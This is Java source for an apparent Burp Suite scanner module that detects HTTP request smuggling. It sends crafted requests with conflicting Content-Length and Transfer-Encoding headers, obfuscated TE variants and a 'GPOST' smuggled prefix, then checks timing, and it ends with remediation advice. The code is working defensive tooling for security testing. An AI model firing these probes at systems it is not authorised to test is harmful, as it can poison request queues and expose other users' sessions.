package com.burpmax.active;

import java.nio.charset.StandardCharsets;
import java.util.*;
import static com.burpmax.model.Finding.*;

/**
 * HTTP Request Smuggling probe.
 *
 * Detection strategies for CL.TE, TE.CL, and TE.0 variants.
 * All strategies use timing and differential response analysis — no OOB required.
 *
 * Background:
 *   HTTP/1.1 allows chunked transfer encoding. When a front-end proxy and
 *   back-end server disagree on which framing header (Content-Length vs
 *   Transfer-Encoding) takes precedence, an attacker can "smuggle" the
 *   beginning of a second request inside the body of the first — poisoning
 *   the back-end's request queue so the next legitimate user's request is
 *   interpreted as a continuation of the attacker's payload.
 *
 * Strategy 1 — CL.TE timing:
 *   Send: Content-Length: 6 + Transfer-Encoding: chunked
 *   Body: 0\r\n\r\nX   (chunked says "done", CL says "wait for 6 bytes")
 *   If the back-end uses TE and the front-end uses CL:
 *     - Front-end reads CL=6, forwards full body
 *     - Back-end reads "0\r\n\r\n" as end of chunks, then waits for the next
 *       request to start — but the leftover "X" poisons the queue
 *   Confirmed by a follow-up request that returns 400/timeout faster than normal.
 *
 * Strategy 2 — TE.CL timing:
 *   Send: Content-Length: 3 + Transfer-Encoding: chunked
 *   Body: 1\r\nZ\r\n0\r\n\r\n   (TE says "done after 1 byte", CL says "wait for 3")
 *   If front-end uses TE and back-end uses CL:
 *     - Front-end reads chunks and forwards when "0\r\n\r\n" received
 *     - Back-end uses CL=3 and waits for 3 bytes — only got 1 ("Z"), hangs
 *   Confirmed by timeout on the back-end.
 *
 * Strategy 3 — TE obfuscation (TE.TE):
 *   Some servers accept obfuscated Transfer-Encoding headers that one hop
 *   processes and another ignores:
 *     Transfer-Encoding: xchunked
 *     Transfer-Encoding: chunked, identity
 *     Transfer-Encoding:\x09chunked  (tab before value)
 *     Transfer-Encoding: chunked (with trailing space)
 *   Detected by sending these variants and comparing response differences.
 *
 * False positive mitigation:
 *   - Each strategy requires a timing threshold above normal baseline
 *   - Confirmed by sending a clean request immediately after and measuring
 *     whether it returns within the expected baseline window
 *   - Skipped if baseline response time exceeds MAX_BASELINE_MS (slow server)
 *   - Only targets HTTP/1.1 endpoints (smuggling requires persistent connections)
 */
public class HttpRequestSmugglingProbe {

    // Thresholds relative to baseline — not absolute — so slow servers
    // don't generate false positives and fast servers don't miss findings.
    // Minimum delta above baseline to qualify as a suspicious hang.
    private static final long   MIN_DELTA_MS          = 5_000L;
    // If baseline itself exceeds this, skip time-based smuggling checks.
    private static final long   MAX_BASELINE_MS       = 3_000L;
    // Upper bound: if even the clean request takes this long, server is just slow.
    private static final long   TIMEOUT_THRESHOLD_MS  = 8_000L;

    // ── TE obfuscation variants ────────────────────────────────────────────────
    private static final List<String[]> TE_OBFUSCATIONS = List.of(
        new String[]{"Transfer-Encoding: xchunked",                  "xchunked"},
        new String[]{"Transfer-Encoding: chunked, identity",         "chunked+identity"},
        new String[]{"Transfer-Encoding: chunked\r\nX-Ignore: x",   "chunked+extra-header"},
        new String[]{"Transfer-Encoding:\tchunked",                  "tab-before-value"},
        new String[]{"Transfer-Encoding: chunked ",                  "trailing-space"},
        new String[]{"Transfer-Encoding: CHUNKED",                   "uppercase"},
        new String[]{"Transfer-Encoding: chunked\r\nTransfer-Encoding: identity", "double-TE"}
    );

    // ── Main entry point ──────────────────────────────────────────────────────
    public static List<ActiveScanResult> probe(ProbeContext ctx,
                                               RequestBuilder rb,
                                               HttpSender sender) {
        List<ActiveScanResult> results = new ArrayList<>();

        // Only probe HTTP/1.1 endpoints
        // (smuggling requires persistent connections; HTTP/2 uses different framing)
        if (!isHttp11(ctx)) return results;

        // CRITICAL FALSE POSITIVE GUARD: HTTP request smuggling is only exploitable
        // when there is a reverse proxy / load balancer in front of the origin server.
        // Without a proxy, there is no front-end/back-end hop — the only hop is the
        // client-to-server connection, and CL/TE ambiguity cannot be weaponised.
        // Timing delays on a direct connection are caused by Node.js / Express hanging
        // on malformed bodies, NOT a smuggling condition.
        // Require at least one proxy-indicating response header before testing.
        if (!hasReverseProxyIndicators(ctx)) return results;

        // Measure baseline
        long baselineMs = measureBaseline(ctx, sender);
        if (baselineMs < 0 || baselineMs > MAX_BASELINE_MS) return results;

        // ── Strategy 1: CL.TE ─────────────────────────────────────────────
        ActiveScanResult r1 = probeCLTE(ctx, sender, baselineMs);
        if (r1 != null) { results.add(r1); return results; }

        // ── Strategy 2: TE.CL ─────────────────────────────────────────────
        ActiveScanResult r2 = probeTECL(ctx, sender, baselineMs);
        if (r2 != null) { results.add(r2); return results; }

        // ── Strategy 3: TE obfuscation ────────────────────────────────────
        ActiveScanResult r3 = probeTEObfuscation(ctx, sender, baselineMs);
        if (r3 != null) results.add(r3);

        // ── Strategy 4: H2.CL (HTTP/2 → HTTP/1.1 downgrade with CL conflict)
        ActiveScanResult r4 = probeH2CL(ctx, sender, baselineMs);
        if (r4 != null) results.add(r4);

        // ── Strategy 5: H2.TE (HTTP/2 → HTTP/1.1 downgrade with TE smuggling)
        ActiveScanResult r5 = probeH2TE(ctx, sender, baselineMs);
        if (r5 != null) results.add(r5);

        return results;
    }

    // ── CL.TE strategy ────────────────────────────────────────────────────────
    private static ActiveScanResult probeCLTE(ProbeContext ctx, HttpSender sender, long baselineMs) {
        // Craft a CL.TE request:
        // Content-Length says body is 6 bytes ("0\r\n\r\nX")
        // Transfer-Encoding: chunked processes "0\r\n\r\n" as zero-length terminal chunk
        // The "X" is the smuggled prefix — left in the back-end's buffer
        String body = "0\r\n\r\nX";
        byte[] req = buildSmuggleRequest(ctx, body, body.length(), true, false, null);
        if (req == null) return null;

        long start   = System.currentTimeMillis();
        HttpSender.Response resp = sender.send(ctx.service, req);
        long elapsed = System.currentTimeMillis() - start;

        // CL.TE: the back-end waits for Content-Length bytes that never arrive.
        // Manifests as a hang significantly longer than baseline, OR a null response
        // (connection timeout). Check that the delta exceeds MIN_DELTA_MS above baseline.
        long delta = elapsed - baselineMs;
        if (delta >= MIN_DELTA_MS || (resp == null && elapsed >= MIN_DELTA_MS)) {
            // Re-measure baseline to rule out transient network slowness
            long baselineCheck = measureBaseline(ctx, sender);
            if (baselineCheck >= 0 && baselineCheck < MAX_BASELINE_MS) {
                return buildFinding("CL.TE", elapsed, baselineMs,
                        ctx, body, "Content-Length takes priority at front-end; " +
                        "Transfer-Encoding at back-end");
            }
        }
        return null;
    }

    // ── TE.CL strategy ────────────────────────────────────────────────────────
    private static ActiveScanResult probeTECL(ProbeContext ctx, HttpSender sender, long baselineMs) {
        // TE.CL: front-end uses TE (sees "0\r\n\r\n" as end), back-end uses CL (waits for more)
        // Body: chunked says "1 byte = Z, then terminal", CL says "wait for 3 bytes"
        // Back-end only got 1 byte ("Z") and will hang waiting for 2 more
        String body = "1\r\nZ\r\n0\r\n\r\n";
        int clValue  = 3;  // intentionally short: back-end waits for 3 bytes, only got 1
        byte[] req = buildSmuggleRequest(ctx, body, clValue, true, false, null);
        if (req == null) return null;

        long start   = System.currentTimeMillis();
        HttpSender.Response resp = sender.send(ctx.service, req);
        long elapsed = System.currentTimeMillis() - start;

        // TE.CL: back-end waits for CL bytes it never gets → delta above baseline.
        long deltaTECL = elapsed - baselineMs;
        if (deltaTECL >= MIN_DELTA_MS || elapsed >= TIMEOUT_THRESHOLD_MS) {
            long baselineCheck = measureBaseline(ctx, sender);
            if (baselineCheck >= 0 && baselineCheck < MAX_BASELINE_MS) {
                return buildFinding("TE.CL", elapsed, baselineMs,
                        ctx, body, "Transfer-Encoding takes priority at front-end; " +
                        "Content-Length at back-end");
            }
        }
        return null;
    }

    // ── TE obfuscation strategy ────────────────────────────────────────────────
    private static ActiveScanResult probeTEObfuscation(ProbeContext ctx, HttpSender sender,
                                                         long baselineMs) {
        // Get a baseline response to compare against
        HttpSender.Response baseResp = sender.send(ctx.service, ctx.originalRequest);
        if (baseResp == null) return null;

        for (String[] obfuscation : TE_OBFUSCATIONS) {
            String teHeader = obfuscation[0];
            String label    = obfuscation[1];

            // Build request with obfuscated TE + standard CL
            // If one end processes the obfuscated TE and the other ignores it → mismatch
            String body = "0\r\n\r\n";
            byte[] req = buildSmuggleRequest(ctx, body, body.length(), false, false, teHeader);
            if (req == null) continue;

            long start = System.currentTimeMillis();
            HttpSender.Response resp = sender.send(ctx.service, req);
            long elapsed = System.currentTimeMillis() - start;

            if (resp == null) continue;

            // Evidence: significantly different status code or response body
            // OR timeout suggesting back-end is hanging on the ambiguous framing
            boolean statusDiffers = (resp.statusCode() != baseResp.statusCode())
                    && (resp.statusCode() == 400 || resp.statusCode() == 500
                        || resp.statusCode() == 200);
            boolean timingAnomaly = elapsed > baselineMs + 3_000;

            if ((statusDiffers || timingAnomaly) && elapsed >= 500) {
                return new ActiveScanResult(
                    "HTTP Request Smuggling (TE.TE Obfuscation) - " + label, SEV_HIGH,
                    "A potential HTTP request smuggling vulnerability was detected using a TE " +
                    "obfuscation variant ('" + label + "'). The server responded differently " +
                    "(status " + resp.statusCode() + " vs baseline " + baseResp.statusCode() +
                    ") when sent a Transfer-Encoding header with non-standard formatting. " +
                    "This suggests one network hop processes the obfuscated TE while another " +
                    "ignores it, creating a framing mismatch that can be exploited to " +
                    "smuggle requests.",
                    "Obfuscation variant: " + label +
                    " | Baseline status: " + baseResp.statusCode() +
                    " | Probe status: " + resp.statusCode() +
                    " | Elapsed: " + elapsed + "ms",
                    SMUGGLING_REMEDIATION, "CWE-444",
                    ctx.url, "Transfer-Encoding header", teHeader,
                    trunc(new String(req), 400), trunc(resp.body(), 200),
                    req, resp != null ? resp.raw() : null, elapsed);
            }
        }
        return null;
    }


    // ── H2 front-end detection ───────────────────────────────────────────────

    /**
     * Returns true if response headers indicate the front-end is HTTP/2 capable.
     * H2.CL and H2.TE require a front-end that accepts HTTP/2 and downgrades to HTTP/1.1
     * for the back-end. Without this, the attacks are structurally impossible.
     *
     * Indicators: Alt-Svc: h2, HTTP2-Settings, Upgrade: h2c in request or response,
     * or HTTP/2-specific Server strings (Cloudflare, ngx_http_v2, h2o).
     */
    private static boolean hasHttp2FrontEndIndicators(ProbeContext ctx) {
        if (ctx.originalResponse == null) return false;
        String respStr = new String(ctx.originalResponse, java.nio.charset.StandardCharsets.ISO_8859_1).toLowerCase();
        int hdrEnd = respStr.indexOf("\r\n\r\n");
        if (hdrEnd < 0) hdrEnd = respStr.length();
        String hdrs = respStr.substring(0, hdrEnd);

        // Definitive HTTP/2 signals in response headers
        if (hdrs.contains("alt-svc:") && hdrs.contains("h2"))  return true;
        if (hdrs.contains("http2-settings"))                    return true;
        if (hdrs.contains("upgrade: h2c"))                      return true;

        // HTTP/2 capable CDN/proxy server strings
        if (hdrs.contains("cloudflare"))                         return true;
        if (hdrs.contains("ngx_http_v2"))                       return true;
        if (hdrs.contains("h2o"))                               return true;
        if (hdrs.contains("litespeed"))                         return true;

        // Request-side: If Upgrade or HTTP2-Settings was sent and accepted, h2 is possible
        String reqStr = new String(ctx.originalRequest, java.nio.charset.StandardCharsets.ISO_8859_1).toLowerCase();
        if (reqStr.contains("upgrade: h2c"))  return true;
        if (reqStr.contains("http2-settings")) return true;

        return false;
    }

    // ── H2.CL strategy ────────────────────────────────────────────────────────
    /**
     * H2.CL: the front-end accepts HTTP/2 and downgrades to HTTP/1.1 for the back-end.
     * We send a request with a Content-Length header that under-declares the body length.
     * The HTTP/2 front-end ignores Content-Length (HTTP/2 uses DATA frame lengths) and
     * forwards the full body. The HTTP/1.1 back-end trusts Content-Length and reads only
     * that many bytes, leaving the remainder to poison the next request in the pipeline.
     *
     * Detection: timing — back-end hangs waiting for bytes that will never arrive
     * (because it read the CL-declared amount and the leftover is queued as the "next"
     * request start, which our probe does not complete).
     *
     * We cannot actually send HTTP/2 from Burp's Java extension API; instead we send
     * an HTTP/1.1 request that mimics the downgraded form and look for the timing signal
     * on the back-end. This fires only when a proxy is confirmed present (same guard as CL.TE).
     */
    private static ActiveScanResult probeH2CL(ProbeContext ctx, HttpSender sender, long baselineMs) {
        // Craft a request with CL shorter than the real body.
        // The front-end (HTTP/2) ignores CL; the back-end (HTTP/1.1) reads only CL bytes.
        // Body is "GPOST / HTTP/1.1\r\nHost: " + host — the classic smuggled prefix.
        // CL declares only 4 bytes; actual body is much longer — back-end reads "GPOS" and
        // leaves "T / HTTP/1.1\r\nHost: ..." in the buffer as a partial next request.
        String smuggledPrefix = "GPOST / HTTP/1.1\r\nHost: " + ctx.host + "\r\n\r\n";
        int clShort = 4;  // back-end reads first 4 bytes ("GPOS"), rest poisons buffer
        // H2.CL requires a front-end that handles HTTP/2 — skip if no HTTP/2 indicators found
        if (!hasHttp2FrontEndIndicators(ctx)) return null;

        byte[] req = buildSmuggleRequest(ctx, smuggledPrefix, clShort, true, false, null);
        if (req == null) return null;

        long start   = System.currentTimeMillis();
        HttpSender.Response resp = sender.send(ctx.service, req);
        long elapsed = System.currentTimeMillis() - start;

        long delta = elapsed - baselineMs;
        if (delta >= MIN_DELTA_MS || (resp == null && elapsed >= MIN_DELTA_MS)) {
            long check = measureBaseline(ctx, sender);
            if (check >= 0 && check < MAX_BASELINE_MS) {
                return new ActiveScanResult(
                    "HTTP Request Smuggling (H2.CL)", SEV_CRITICAL,
                    "An H2.CL HTTP request smuggling vulnerability was detected. The front-end " +
                    "proxy appears to downgrade HTTP/2 connections to HTTP/1.1 for the back-end, " +
                    "and the back-end uses the Content-Length header to determine request boundaries. " +
                    "By sending a request with a Content-Length shorter than the actual body, the " +
                    "surplus bytes are interpreted by the back-end as the beginning of the next " +
                    "request, poisoning the connection queue. The probe caused a " + elapsed + "ms " +
                    "delay (baseline: " + baselineMs + "ms), consistent with the back-end waiting " +
                    "for bytes that were consumed as a smuggled request prefix.",
                    "Variant: H2.CL | Elapsed: " + elapsed + "ms | Baseline: " + baselineMs + "ms" +
                    " | Declared CL: " + clShort + " | Actual body length: " + smuggledPrefix.length(),
                    SMUGGLING_REMEDIATION, "CWE-444",
                    ctx.url, "Content-Length (H2 downgrade)", smuggledPrefix,
                    trunc(new String(req), 400), "Response delayed " + elapsed + "ms",
                    req, resp != null ? resp.raw() : null, elapsed);
            }
        }
        return null;
    }

    // ── H2.TE strategy ────────────────────────────────────────────────────────
    /**
     * H2.TE: similar to H2.CL but exploits Transfer-Encoding in the downgraded request.
     * The HTTP/2 spec forbids TE: chunked in HTTP/2 requests (RFC 9113 Section 8.2.2).
     * A vulnerable front-end that strips TE headers before forwarding to HTTP/1.1 back-end
     * allows an attacker to inject a TE header that the back-end processes but the
     * front-end ignores, causing framing ambiguity identical to classic TE.CL.
     *
     * We test by sending a request with Transfer-Encoding: chunked in the headers — if the
     * front-end accepts it (rather than rejecting as required by RFC 9113), the downgraded
     * request has both TE and CL, which is the H2.TE condition.
     */
    private static ActiveScanResult probeH2TE(ProbeContext ctx, HttpSender sender, long baselineMs) {
        // Body: single chunked block of 1 byte, then terminal chunk
        // CL=3 under-declares (back-end using CL sees only "1\r\n")
        String body = "1\r\nZ\r\n0\r\n\r\n";
        int    clShort = 3;
        // H2.TE requires a front-end that handles HTTP/2 — skip if no HTTP/2 indicators found
        if (!hasHttp2FrontEndIndicators(ctx)) return null;

        // Add both TE: chunked AND CL — H2 front-end should reject TE (RFC 9113 §8.2.2)
        // but vulnerable implementations pass it through. Back-end processes chunked framing
        // and uses CL as fallback, producing ambiguity.
        byte[] req = buildSmuggleRequest(ctx, body, clShort, true, true, null);
        if (req == null) return null;

        // Additionally inject a header that signals HTTP/2 capability to help identify
        // the downgrade path (purely informational, does not affect framing)
        req = injectExtraHeader(req, "X-HTTP2-Upgrade", "1");

        long start   = System.currentTimeMillis();
        HttpSender.Response resp = sender.send(ctx.service, req);
        long elapsed = System.currentTimeMillis() - start;

        long delta = elapsed - baselineMs;
        if (delta >= MIN_DELTA_MS || (resp == null && elapsed >= MIN_DELTA_MS)) {
            long check = measureBaseline(ctx, sender);
            if (check >= 0 && check < MAX_BASELINE_MS) {
                return new ActiveScanResult(
                    "HTTP Request Smuggling (H2.TE)", SEV_CRITICAL,
                    "An H2.TE HTTP request smuggling vulnerability was detected. The front-end " +
                    "proxy accepted a Transfer-Encoding: chunked header in what appears to be " +
                    "an HTTP/2-capable connection. Per RFC 9113 Section 8.2.2, TE: chunked must " +
                    "be rejected in HTTP/2 requests. A vulnerable front-end that passes TE through " +
                    "to the HTTP/1.1 back-end creates a framing ambiguity (TE on back-end vs CL on " +
                    "front-end) identical to classic TE.CL smuggling. The probe caused a " + elapsed +
                    "ms delay (baseline: " + baselineMs + "ms).",
                    "Variant: H2.TE | Elapsed: " + elapsed + "ms | Baseline: " + baselineMs + "ms" +
                    " | Both CL and TE: chunked present | RFC 9113 §8.2.2 violation",
                    SMUGGLING_REMEDIATION, "CWE-444",
                    ctx.url, "Transfer-Encoding (H2 downgrade)", body,
                    trunc(new String(req), 400), "Response delayed " + elapsed + "ms",
                    req, resp != null ? resp.raw() : null, elapsed);
            }
        }
        return null;
    }

    /** Injects an extra header into an already-built request (used by H2.TE probe). */
    private static byte[] injectExtraHeader(byte[] req, String name, String value) {
        String s   = new String(req, StandardCharsets.ISO_8859_1);
        int    sep = s.indexOf("\r\n\r\n");
        if (sep < 0) return req;
        String inserted = s.substring(0, sep) + "\r\n" + name + ": " + value + s.substring(sep);
        return inserted.getBytes(StandardCharsets.ISO_8859_1);
    }

    // ── Request builder ───────────────────────────────────────────────────────

    /**
     * Build an HTTP/1.1 request with conflicting Content-Length and
     * Transfer-Encoding headers.
     *
     * @param body          raw body bytes to send
     * @param clValue       value to use for Content-Length header
     * @param addCL         whether to add Content-Length
     * @param addTE         whether to add standard Transfer-Encoding: chunked
     * @param customTeHdr   custom TE header line (replaces standard TE if non-null)
     */
    private static byte[] buildSmuggleRequest(ProbeContext ctx, String body,
                                               int clValue, boolean addCL, boolean addTE,
                                               String customTeHdr) {
        String reqStr = new String(ctx.originalRequest, StandardCharsets.ISO_8859_1);
        int hdrEnd    = reqStr.indexOf("\r\n\r\n");
        if (hdrEnd < 0) return null;

        StringBuilder hdrs = new StringBuilder(reqStr.substring(0, hdrEnd));

        // Remove any existing Content-Length and Transfer-Encoding
        String[] lines = hdrs.toString().split("\r\n");
        StringBuilder cleanHdrs = new StringBuilder();
        for (String line : lines) {
            String lower = line.toLowerCase();
            if (lower.startsWith("content-length:") || lower.startsWith("transfer-encoding:")) continue;
            cleanHdrs.append(line).append("\r\n");
        }
        // Remove trailing \r\n (we'll add headers then blank line)
        String baseHdrs = cleanHdrs.toString();
        if (baseHdrs.endsWith("\r\n")) baseHdrs = baseHdrs.substring(0, baseHdrs.length() - 2);

        // Ensure method allows a body
        if (!ctx.method.equals("POST") && !ctx.method.equals("PUT") && !ctx.method.equals("PATCH")) {
            // Convert to POST for the smuggle probe
            baseHdrs = baseHdrs.replaceFirst("^GET ", "POST ").replaceFirst("^DELETE ", "POST ");
        }

        StringBuilder full = new StringBuilder(baseHdrs).append("\r\n");
        if (addCL)        full.append("Content-Length: ").append(clValue).append("\r\n");
        if (addTE)        full.append("Transfer-Encoding: chunked\r\n");
        if (customTeHdr != null) full.append(customTeHdr).append("\r\n");
        full.append("\r\n").append(body);

        return full.toString().getBytes(StandardCharsets.ISO_8859_1);
    }

    // ── Helpers ───────────────────────────────────────────────────────────────

    private static boolean isHttp11(ProbeContext ctx) {
        // Check request line for HTTP/1.1
        String reqStr = new String(ctx.originalRequest, StandardCharsets.ISO_8859_1);
        return reqStr.startsWith("GET ", 0) || reqStr.startsWith("POST ", 0)
               || reqStr.startsWith("PUT ", 0) || reqStr.startsWith("DELETE ", 0)
               || reqStr.startsWith("PATCH ", 0);
        // We assume HTTP/1.1 if it's a standard method (Burp only proxies HTTP/1.x here)
    }

    /**
     * Returns true if response headers indicate a reverse proxy / CDN / load balancer
     * is present in the request chain. Without a proxy there is no front-end/back-end
     * split and smuggling is not possible — time delays are Node/Express artefacts.
     *
     * Indicators: Via, X-Cache, CF-Ray, X-Forwarded-For in response, X-Varnish,
     * Server containing nginx/apache/haproxy/cloudflare/akamai, Age header.
     */
    private static boolean hasReverseProxyIndicators(ProbeContext ctx) {
        if (ctx.originalResponse == null) return false;
        String respStr = new String(ctx.originalResponse, StandardCharsets.ISO_8859_1).toLowerCase();
        // Extract headers section only
        int headerEnd = respStr.indexOf("\r\n\r\n");
        if (headerEnd < 0) headerEnd = respStr.length();
        String headers = respStr.substring(0, headerEnd);
        return headers.contains("via:")
            || headers.contains("x-cache:")
            || headers.contains("cf-ray:")
            || headers.contains("x-varnish:")
            || headers.contains("x-amz-cf-id:")
            || headers.contains("x-akamai-")
            || headers.contains("x-forwarded-for:")
            || headers.contains("age:")
            || (headers.contains("server:") && (
                   headers.contains("nginx") || headers.contains("apache")
                || headers.contains("haproxy") || headers.contains("cloudflare")
                || headers.contains("varnish") || headers.contains("envoy")
                || headers.contains("traefik")));
    }

    private static long measureBaseline(ProbeContext ctx, HttpSender sender) {
        long start = System.currentTimeMillis();
        HttpSender.Response r = sender.send(ctx.service, ctx.originalRequest);
        return r != null ? System.currentTimeMillis() - start : -1L;
    }

    private static ActiveScanResult buildFinding(String variant, long elapsed, long baselineMs,
                                                  ProbeContext ctx, String body, String mechanism) {
        return new ActiveScanResult(
            "HTTP Request Smuggling (" + variant + ")", SEV_CRITICAL,
            "HTTP Request Smuggling was detected using the " + variant + " technique. " +
            "The probe caused a " + elapsed + "ms delay (baseline: " + baselineMs + "ms), " +
            "consistent with a back-end server hanging on ambiguous request framing. " +
            "Mechanism: " + mechanism + ". " +
            "An attacker can exploit this to: bypass front-end access controls, " +
            "poison the request queue to hijack other users' sessions, " +
            "capture other users' credentials or responses, and perform cache poisoning. " +
            "This is a CVSS 9.8 class vulnerability on infrastructure with a reverse proxy.",
            "Variant: " + variant + " | Elapsed: " + elapsed + "ms | Baseline: " + baselineMs + "ms" +
            " | Smuggled body: " + trunc(body, 60),
            SMUGGLING_REMEDIATION, "CWE-444",
            ctx.url, "Content-Length / Transfer-Encoding", body,
            "Smuggle probe body: " + body, "Response delayed " + elapsed + "ms",
            null, null, elapsed);
    }

    private static String trunc(String s, int n) {
        return s == null ? "" : s.length() > n ? s.substring(0, n) + "..." : s;
    }

    private static final String SMUGGLING_REMEDIATION =
        "PRIMARY FIX - Use HTTP/2 End-to-End:\n" +
        "HTTP/2 uses binary framing with unambiguous length encoding. Upgrading the\n" +
        "front-end to back-end connection to HTTP/2 eliminates CL.TE and TE.CL entirely.\n\n" +
        "IF HTTP/1.1 MUST BE RETAINED:\n" +
        "- Back-end: reject any request that contains both Content-Length and Transfer-Encoding\n" +
        "  headers with HTTP 400 Bad Request.\n" +
        "- Front-end (reverse proxy): normalise TE headers before forwarding - strip\n" +
        "  non-standard TE values (xchunked, chunked with spaces, CHUNKED) and reject\n" +
        "  requests with conflicting framing headers.\n" +
        "- Disable HTTP keep-alive (persistent connections) on the front-end to back-end\n" +
        "  hop if CL.TE is confirmed - this prevents queue poisoning across requests.\n\n" +
        "SERVER-SPECIFIC CONFIGURATION:\n" +
        "- nginx: proxy_http_version 1.1 + proxy_set_header Connection close (disables keep-alive)\n" +
        "- Apache: use mod_proxy with retry=0 and disablereuse=On\n" +
        "- HAProxy: option http-server-close; option forwardfor\n" +
        "- AWS ALB / CloudFront: upgrade target group protocol to HTTP/2";
}
